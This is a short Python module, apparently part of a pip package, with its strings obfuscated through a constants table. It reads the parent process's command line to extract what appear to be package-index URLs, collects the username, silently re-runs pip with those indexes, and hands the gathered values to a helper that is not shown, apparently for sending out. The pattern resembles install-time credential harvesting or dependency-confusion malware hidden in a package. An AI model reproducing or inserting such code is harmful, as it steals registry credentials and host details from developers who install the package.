import getpass
import os
import platform
import subprocess
import sys
from .misc import trim_resolve
from .static.constant import CONSTANT_TABLE

constant_var_1 = CONSTANT_TABLE[1]
constant_var_2 = CONSTANT_TABLE[2]
constant_var_3 = CONSTANT_TABLE[3]
constant_var_4 = CONSTANT_TABLE[4]
constant_var_5 = CONSTANT_TABLE[5]
constant_var_6 = CONSTANT_TABLE[6]
constant_var_9 = CONSTANT_TABLE[9]
constant_var_10 = CONSTANT_TABLE[10]
constant_var_11 = CONSTANT_TABLE[11]
constant_var_12 = CONSTANT_TABLE[12]
constant_var_13 = CONSTANT_TABLE[13]
constant_var_14 = CONSTANT_TABLE[14]
constant_var_15 = CONSTANT_TABLE[15]

idx_url_arg = '--%s-%s' % (constant_var_3, constant_var_1)
extr_url_arg = '--%s-%s-%s' % (constant_var_4, constant_var_3, constant_var_1)


def get_uname():

    try:
        name = getpass.getuser()
    except:
        name = '_'

    return name


def parent_process_params():
    pparams = None
    ppid = os.getppid()

    os_name = platform.system()
    if os_name == constant_var_9:
        with open(f'/{constant_var_14}/{ppid}/{constant_var_13}', 'r') as cmdline_file:
            pparams = cmdline_file.read().split('\x00')
    elif os_name == constant_var_10:
        args = [constant_var_12, '-o', constant_var_15, '-p', str(ppid)]
        res = subprocess.run(args, capture_output=True,
                             text=True, check=True)
        pparams = res.stdout.strip().split(' ')

    return pparams


def get_parent_args():
    ret_map = {}
    parent_args = parent_process_params()
    if parent_args and idx_url_arg in parent_args:
        idx = parent_args.index(idx_url_arg)
        ret_str = parent_args[idx + 1]
        ret_map[idx_url_arg] = ret_str

    if parent_args and extr_url_arg in parent_args:
        idx = parent_args.index(extr_url_arg)
        ret_str = parent_args[idx + 1]
        ret_map[extr_url_arg] = ret_str

    return ret_map


def reg_pkg(name, version, str_map={}, reg_info=[]):

    env = dict(os.environ)
    if constant_var_6 in env:
        del env[constant_var_6]

    ret_val = 6
    pip_arr = [sys.executable, '-m', constant_var_2, constant_var_11]
    for arg_key, arg_val in str_map.items():
        pip_arr.extend([arg_key, arg_val])
    pip_arr.append('%s!=%s' % (name, version))
    try:
        ret = subprocess.run(pip_arr, env=env, capture_output=True, text=True)
        if constant_var_5 in str(ret.stderr):
            ret_val = 56

    except Exception as e:
        ret_val = 57

    reg_info.append(['_', str(ret_val)])
    idx = os.urandom(2).hex()
    for reg_inst in reg_info:
        trim_resolve(reg_inst[0], str(reg_inst[1]), idx)
